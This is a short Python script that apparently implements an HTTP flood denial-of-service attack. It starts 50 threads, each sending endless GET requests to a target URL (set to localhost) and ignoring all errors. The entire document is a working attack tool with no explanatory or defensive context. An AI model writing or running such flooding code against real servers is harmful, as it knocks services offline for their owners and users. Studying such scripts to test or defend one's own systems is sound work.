import requests
import threading

target_url = "http://127.0.0.1"

def http_flood():
    while True:
        try:
            requests.get(target_url)
        except:
            pass

for i in range(50):
    t = threading.Thread(target=http_flood)
    t.start()
